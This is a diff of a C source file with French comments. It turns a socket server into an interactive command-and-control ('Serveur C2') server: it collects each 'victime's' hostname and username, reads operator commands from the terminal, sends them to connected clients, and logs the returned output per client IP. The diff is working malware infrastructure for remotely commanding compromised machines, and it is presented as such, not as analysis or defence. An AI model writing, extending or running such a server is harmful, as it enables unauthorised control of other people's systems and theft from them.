@@ -16,8 +16,11 @@
 #define BUFFER_SIZE 1024
 #define CLIENT_DIR "clients"
 #define LOG_FILE "./server.log"
+#define LOG_DIR "clients_logs"
 
-// Fonction pour écrire dans le fichier log
+int server_socket = -1; // Variable pour stocker le socket du serveur
+
+// Fonction pour écrire dans le fichier log principal
 void write_log(const char *message) {
     FILE *log_file = fopen(LOG_FILE, "a");
     if (log_file) {
@@ -31,29 +34,34 @@ void write_log(const char *message) {
     }
 }
 
-// Fonction pour compter le nombre de fichiers dans le dossier clients
-int count_client_files() {
-    int count = 0;
-    struct dirent *entry;
-    DIR *dir = opendir(CLIENT_DIR);
+// Fonction pour initialiser un fichier log pour chaque client
+void init_client_log(const char *client_ip) {
+    char log_filename[BUFFER_SIZE];
+    snprintf(log_filename, sizeof(log_filename), "%s/%s.txt", LOG_DIR, client_ip);
 
-    if (dir == NULL) {
-        if (errno == ENOENT) {
-            return 0; // Le dossier n'existe pas encore
-        }
-        perror("Erreur d'ouverture du dossier clients");
-        write_log("Erreur d'ouverture du dossier clients.");
-        return -1;
+    FILE *file = fopen(log_filename, "a");
+    if (file) {
+        time_t now = time(NULL);
+        char *timestamp = ctime(&now);
+        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
+        fprintf(file, "=== Connexion du client %s à %s ===\n", client_ip, timestamp);
+        fclose(file);
     }
+}
 
-    while ((entry = readdir(dir)) != NULL) {
-        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
-            count++;
-        }
+// Fonction pour loguer les données spécifiques du client
+void log_client_data(const char *client_ip, const char *data) {
+    char log_filename[BUFFER_SIZE];
+    snprintf(log_filename, sizeof(log_filename), "%s/%s.txt", LOG_DIR, client_ip);
+
+    FILE *file = fopen(log_filename, "a");
+    if (file) {
+        time_t now = time(NULL);
+        char *timestamp = ctime(&now);
+        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
+        fprintf(file, "[%s] %s\n", timestamp, data);
+        fclose(file);
     }
-
-    closedir(dir);
-    return count;
 }
 
 // Fonction pour gérer les connexions clients
@@ -61,95 +69,112 @@ void *client_handler(void *client_socket) {
     int sock = *(int *)client_socket;
     free(client_socket);
 
-    char buffer[BUFFER_SIZE];
-    char filename[256];
-    char client_ip[INET_ADDRSTRLEN];
     struct sockaddr_in client_addr;
     socklen_t addr_len = sizeof(client_addr);
+    char buffer[BUFFER_SIZE];
+    char client_ip[INET_ADDRSTRLEN];
+    char hostname[BUFFER_SIZE], username[BUFFER_SIZE];
 
+    // Récupérer l'IP du client
     if (getpeername(sock, (struct sockaddr *)&client_addr, &addr_len) == -1) {
-        perror("Erreur lors de la récupération des informations client");
-        write_log("Erreur lors de la récupération des informations client.");
+        perror("Erreur récupération IP client");
         close(sock);
         return NULL;
     }
-
     inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
 
-    struct hostent *host_info = gethostbyaddr(&client_addr.sin_addr, sizeof(client_addr.sin_addr), AF_INET);
-    const char *hostname = (host_info != NULL) ? host_info->h_name : "Inconnu";
+    printf("Client connecté : %s\n", client_ip);
 
-    // Afficher les informations du client dans le terminal
-    printf("Nouvelle connexion :\n");
-    printf("  Adresse IP : %s\n", client_ip);
-    printf("  Nom d'hôte : %s\n", hostname);
+    // Créer le dossier clients si inexistant
+    mkdir(LOG_DIR, 0777);
 
-    // Logger les informations du client
-    char log_message[256];
-    snprintf(log_message, sizeof(log_message), "Connexion client : IP=%s, Hostname=%s", client_ip, hostname);
-    write_log(log_message);
+    // Initialiser le fichier log du client avec la date de connexion
+    init_client_log(client_ip);
 
-    // Créer le dossier pour les fichiers clients
-    if (mkdir(CLIENT_DIR, 0777) == -1 && errno != EEXIST) {
-        perror("Erreur de création du dossier clients");
-        write_log("Erreur de création du dossier clients.");
-        close(sock);
-        return NULL;
-    }
-
-    // Générer un identifiant basé sur le nombre de fichiers dans le dossier
-    int client_id = count_client_files();
-    if (client_id < 0) {
-        close(sock);
-        return NULL;
-    }
-
-    // Créer le fichier pour le client
-    snprintf(filename, sizeof(filename), "%s/client_%d.txt", CLIENT_DIR, client_id);
-    FILE *file = fopen(filename, "w");
-    if (!file) {
-        perror("Erreur d'ouverture de fichier");
-        write_log("Erreur d'ouverture du fichier client.");
-        close(sock);
-        return NULL;
-    }
-
-    // Écrire les informations du client dans le fichier
-    fprintf(file, "Adresse IP : %s\n", client_ip);
-    fflush(file);
-
-    // Recevoir les données du client et les traiter
-    int bytes_received;
-    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
-        buffer[bytes_received] = '\0';
-
-        // Analyser et écrire les informations spécifiques
-        if (strstr(buffer, "Hostname: ") == buffer) {
-            fprintf(file, "Nom d'hôte : %s\n", buffer + 10); // Ajouter après "Hostname: "
-        } else if (strstr(buffer, "Username: ") == buffer) {
-            fprintf(file, "Nom d'utilisateur : %s\n", buffer + 10); // Ajouter après "Username: "
+    // Attendre les informations de la victime (Hostname et Username)
+    memset(buffer, 0, BUFFER_SIZE);
+    int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
+    if (bytes_received <= 0) {
+        if (bytes_received == 0) {
+            printf("Client déconnecté.\n");
         } else {
-            fprintf(file, "Données : %s\n", buffer); // Écrire tout autre message
+            perror("Erreur de réception des informations client");
         }
-        fflush(file); // S'assurer que les données sont écrites immédiatement
+        close(sock);
+        return NULL;
     }
 
-    if (bytes_received == 0) {
-        printf("Client déconnecté : %d\n", sock);
-        snprintf(log_message, sizeof(log_message), "Client déconnecté : %d", sock);
-        write_log(log_message);
-    } else if (bytes_received < 0) {
-        perror("Erreur de réception");
-        write_log("Erreur de réception des données du client.");
+    buffer[bytes_received] = '\0';
+    sscanf(buffer, "Hostname: %s\nUsername: %s", hostname, username);
+    printf("Hostname: %s\nUsername: %s\n", hostname, username);
+
+    // Loguer les informations du client (Hostname et Username)
+    char log_entry[BUFFER_SIZE];
+    snprintf(log_entry, sizeof(log_entry), "Hostname: %s\nUsername: %s", hostname, username);
+    log_client_data(client_ip, log_entry);
+
+    // Boucle pour envoyer les commandes après réception des informations
+    while (1) {
+        // Attendre une commande depuis l'utilisateur du serveur
+        printf("Entrer une commande à envoyer : ");
+        fgets(buffer, BUFFER_SIZE, stdin);
+
+        // Supprimer le '\n' à la fin
+        buffer[strcspn(buffer, "\n")] = 0;
+
+        // Logger la commande
+        snprintf(log_entry, sizeof(log_entry), "Commande envoyée : %s", buffer);
+        log_client_data(client_ip, log_entry);
+
+        // Envoyer la commande au client
+        if (send(sock, buffer, strlen(buffer), 0) == -1) {
+            perror("Erreur d'envoi");
+            break;
+        }
+
+        // Attendre une réponse du client
+        memset(buffer, 0, BUFFER_SIZE);
+        int total_bytes_received = 0;
+        char temp_buffer[BUFFER_SIZE];
+
+        while (1) {
+            // Recevoir des données du client
+            int bytes_received = recv(sock, temp_buffer, sizeof(temp_buffer) - 1, 0);
+            if (bytes_received <= 0) {
+                if (bytes_received == 0) {
+                    printf("Client déconnecté.\n");
+                } else {
+                    perror("Erreur de réception");
+                }
+                close(sock);
+                return NULL;
+            }
+
+            total_bytes_received += bytes_received;
+            temp_buffer[bytes_received] = '\0'; // Ajouter le caractère de fin de chaîne
+
+            // Ajouter ce qui a été reçu dans le buffer complet
+            strncat(buffer, temp_buffer, sizeof(buffer) - strlen(buffer) - 1);
+
+            // Si la réponse est terminée, on sort de la boucle
+            if (bytes_received < sizeof(temp_buffer) - 1) {
+                break;
+            }
+        }
+
+        // Afficher la réponse complète du client
+        printf("Réponse du client : %s\n", buffer);
+
+        // Logger la réponse
+        log_client_data(client_ip, buffer);
     }
 
-    fclose(file);
     close(sock);
     return NULL;
 }
 
-int main() {
-    int server_socket, client_socket;
+// Fonction pour démarrer le serveur
+void start_server() {
     struct sockaddr_in server_addr, client_addr;
     socklen_t addr_size = sizeof(client_addr);
 
@@ -159,7 +184,16 @@ int main() {
     if (server_socket < 0) {
         perror("Erreur de création du socket");
         write_log("Erreur de création du socket.");
-        return 1;
+        exit(1);
+    }
+
+    // Permettre de réutiliser immédiatement le port après l'arrêt du serveur
+    int opt = 1;
+    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) != 0) {
+        perror("Erreur de setsockopt");
+        write_log("Erreur de setsockopt (SO_REUSEADDR).");
+        close(server_socket);
+        exit(1);
     }
 
     server_addr.sin_family = AF_INET;
@@ -170,21 +204,21 @@ int main() {
         perror("Erreur de liaison");
         write_log("Erreur de liaison du socket.");
         close(server_socket);
-        return 1;
+        exit(1);
     }
 
     if (listen(server_socket, 10) < 0) {
         perror("Erreur d'écoute");
         write_log("Erreur d'écoute sur le socket.");
         close(server_socket);
-        return 1;
+        exit(1);
     }
 
     printf("Serveur C2 en attente de connexions sur le port %d...\n", PORT);
     write_log("Serveur C2 prêt à accepter des connexions.");
 
     while (1) {
-        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
+        int client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
         if (client_socket < 0) {
             perror("Erreur d'acceptation");
             write_log("Erreur d'acceptation d'une connexion client.");
@@ -210,8 +244,32 @@ int main() {
 
         pthread_detach(thread_id);
     }
+}
 
-    close(server_socket);
-    write_log("Serveur arrêté.");
+// Fonction pour arrêter le serveur
+void stop_server() {
+    if (server_socket != -1) {
+        close(server_socket);
+        server_socket = -1;
+        write_log("Serveur arrêté.");
+    } else {
+        write_log("Le serveur n'était pas en cours d'exécution.");
+    }
+}
+
+void handle_signal(int signal) {
+    if (signal == SIGINT) {
+        write_log("Arrêt du serveur par SIGINT (Ctrl+C).");
+        stop_server();
+        exit(0);
+    }
+}
+
+int main() {
+    signal(SIGINT, handle_signal); // Capturer SIGINT pour un arrêt propre
+
+    // Lancer le serveur
+    start_server();
+
     return 0;
 }
